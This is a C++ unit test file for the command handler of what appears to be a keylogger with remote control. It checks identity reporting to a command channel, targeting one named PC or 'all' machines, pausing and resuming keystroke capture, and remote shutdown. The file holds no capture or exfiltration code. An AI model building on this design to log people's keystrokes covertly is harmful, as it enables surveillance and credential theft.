#include <gtest/gtest.h>

#include "application/commands/CommandHandler.hpp"
#include "domain/services/KeystrokeService.hpp"
#include "domain/services/EncryptionService.hpp"
#include "domain/services/ReportingService.hpp"
#include "../mocks/MockReporter.hpp"

using namespace nuub::application::commands;
using namespace nuub::domain::services;
using namespace nuub::tests::mocks;

class CommandHandlerTest : public ::testing::Test {
protected:
    KeystrokeService keystrokes;
    EncryptionService encryption{"test-pass"};
    ReportingService reporting{encryption, "test_log.txt", "PC-Test"};
    MockReporter reporter;
    bool shutdown_called = false;

    CommandHandler create_handler() {
        return CommandHandler(
            keystrokes, reporting, reporter, "PC-Test",
            [this]() { shutdown_called = true; });
    }
};

TEST_F(CommandHandlerTest, StartReturnsIdentity) {
    auto handler = create_handler();
    auto result = handler.handle_start("PC-Test");
    EXPECT_TRUE(result.is_success());
    EXPECT_FALSE(reporter.messages.empty());
    EXPECT_TRUE(reporter.messages[0].first.find("PC-Test") != std::string::npos);
}

TEST_F(CommandHandlerTest, WrongTargetIsIgnored) {
    auto handler = create_handler();
    handler.handle_start("Other-PC");
    EXPECT_TRUE(reporter.messages.empty());
}

TEST_F(CommandHandlerTest, AllTargetsMatch) {
    auto handler = create_handler();
    auto result = handler.handle_start("all");
    EXPECT_TRUE(result.is_success());
    EXPECT_FALSE(reporter.messages.empty());
}

TEST_F(CommandHandlerTest, PauseAndResume) {
    auto handler = create_handler();

    handler.handle_pause("pc-test");
    EXPECT_TRUE(keystrokes.is_paused());

    handler.handle_resume("pc-test");
    EXPECT_FALSE(keystrokes.is_paused());
}

TEST_F(CommandHandlerTest, ShutdownCallsCallback) {
    auto handler = create_handler();
    handler.handle_shutdown("PC-Test");
    EXPECT_TRUE(shutdown_called);
}
